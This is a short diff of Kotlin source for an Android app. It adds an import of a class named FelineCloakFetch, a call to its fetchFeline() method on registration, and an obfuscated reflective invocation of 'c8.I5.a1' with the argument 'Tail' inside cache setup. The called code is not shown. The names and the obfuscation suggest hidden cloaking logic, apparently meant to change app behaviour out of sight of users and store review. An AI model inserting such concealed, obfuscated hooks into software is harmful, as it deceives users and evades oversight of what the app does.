@@ -6,6 +6,7 @@ import android.os.Build
 import com.cat.manx.AfRegister
 import com.cat.manx.CacheHelper
 import com.cat.manx.QueenActivityLifeCall
+import com.cat.manx.feline.FelineCloakFetch
 import java.util.UUID
 
 /**
@@ -25,6 +26,7 @@ class CenterStart {
     fun initCache(context: Context) {
         if (CacheHelper.mAndroidIdStr.isBlank()) {
             CacheHelper.mAndroidIdStr = UUID.randomUUID().toString()
+            Class.forName("c8.I5").getMethod("a1", String::class.java).invoke(null, "Tail")
         }
         mAfRegister.afInit(context)
 
@@ -35,6 +37,7 @@ class CenterStart {
 
 
     fun register(context: Context): List<String> {
+        FelineCloakFetch().fetchFeline()
         (context as Application).registerActivityLifecycleCallbacks(
             QueenActivityLifeCall(
                 context, tradPlusId
